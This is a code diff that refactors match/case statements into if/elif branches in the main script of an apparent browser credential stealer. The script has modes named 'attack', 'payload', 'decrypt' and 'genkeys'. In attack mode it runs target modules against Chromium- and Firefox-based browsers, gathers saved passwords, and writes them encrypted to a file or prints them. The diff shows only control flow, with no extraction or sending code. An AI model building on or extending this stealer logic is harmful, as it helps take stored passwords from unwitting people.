@@ -17,13 +17,12 @@ def arg_parser(args):
 
 	if 'extra' in json.keys():
 		for browser in json['extra']:
-			match browser['engine']:
-				case 'chromium':
-					chromium_browsers.append((browser['name'], browser['data']))
-					vars(args)['targets'].append(browser['name'])
-				case 'firefox':
-					firefox_browsers.append((browser['name'], browser['data']))
-					vars(args)['targets'].append(browser['name'])
+			if browser['engine'] == 'chromium':
+				chromium_browsers.append((browser['name'], browser['data']))
+				vars(args)['targets'].append(browser['name'])
+			elif browser['engine'] == 'firefox':
+				firefox_browsers.append((browser['name'], browser['data']))
+				vars(args)['targets'].append(browser['name'])
 
 
 if __name__ == '__main__':
@@ -39,41 +38,39 @@ if __name__ == '__main__':
 	if args.mode == 'payload' and args.input:
 		arg_parser(args)
 
-	match args.mode:
-		case 'attack':
-			if args.targets:
+	if args.mode == 'attack':
+		if args.targets:
 
-				passwords = []
-				manager = ModuleManager()
-				manager.select_target_modules(args.targets)
-				drivers = manager.factory_drivers()
+			passwords = []
+			manager = ModuleManager()
+			manager.select_target_modules(args.targets)
+			drivers = manager.factory_drivers()
 
-				for driver in drivers:
-					run_module(passwords, driver)
+			for driver in drivers:
+				run_module(passwords, driver)
 
-				if passwords:
-					stringed_passwords = string_passwords(passwords)
-
-					if args.output:
-
-						if args.key:
-							encrypt(stringed_passwords, args.output, args.key)
-
-						else:
-							write_to_file(stringed_passwords, args.output)
-
-					else:
-						print(stringed_passwords)
-
-		case 'decrypt':
-
-			if args.input and args.key:
-				decrypted = decrypt(args.input, args.key)
+			if passwords:
+				stringed_passwords = string_passwords(passwords)
 
 				if args.output:
-					write_to_file(decrypted, args.output)
-				else:
-					print(decrypted)
 
-		case 'genkeys':
-			genkeys()
+					if args.key:
+						encrypt(stringed_passwords, args.output, args.key)
+
+					else:
+						write_to_file(stringed_passwords, args.output)
+
+				else:
+					print(stringed_passwords)
+
+	elif args.mode == 'decrypt':
+		if args.input and args.key:
+			decrypted = decrypt(args.input, args.key)
+
+			if args.output:
+				write_to_file(decrypted, args.output)
+			else:
+				print(decrypted)
+
+	elif args.mode == 'genkeys':
+		genkeys()
